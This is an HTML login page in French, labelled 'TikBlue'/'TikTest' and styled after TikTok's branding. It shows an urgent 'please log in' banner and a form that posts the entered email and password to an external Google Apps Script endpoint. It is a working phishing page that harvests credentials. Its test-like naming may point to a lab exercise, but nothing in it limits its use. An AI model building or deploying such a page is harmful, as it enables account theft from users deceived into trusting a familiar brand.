<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connexion TikBlue</title>
  <style>
    body {
      background: #000;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      color: white;
    }
    .container {
      background: #111;
      padding: 40px;
      border-radius: 12px;
      width: 100%;
      max-width: 340px;
      text-align: center;
      box-shadow: 0 0 20px rgba(255,255,255,0.1);
    }
    .warning {
      background: #FE2C55;
      padding: 8px;
      border-radius: 6px;
      font-size: 12px;
      margin-bottom: 15px;
    }
    .logo {
      font-size: 28px;
      font-weight: bold;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .logo-icon {
      width: 28px;
      height: 28px;
      background: linear-gradient(45deg, #25F4EE, #FE2C55);
      border-radius: 6px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: none;
      border-radius: 6px;
      box-sizing: border-box;
      font-size: 14px;
    }
    input[type="email"], input[type="password"] {
      background: #222;
      color: white;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #FE2C55;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background: #d91f47;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="warning">⚠ Veuillez vous connecter s'il vous plaît.</div>
    <div class="logo">
      <div class="logo-icon"></div>
      TikTest
    </div>
    <h2>Connexion</h2>
    <form method="post" action="https://script.google.com/macros/s/AKfycbxsajZdbPeHIrPypyBvfrvxoVsUXWu2zD7qfNciVl_qdgxuyxUbW1BzKUo1iRguUxhYpQ/exec">
      <input type="email" name="email" placeholder="Adresse e-mail" required />
      <input type="password" name="password" placeholder="Mot de passe" required />
      <button type="submit">Se connecter</button>
    </form>
  </div>
</body>
</html>
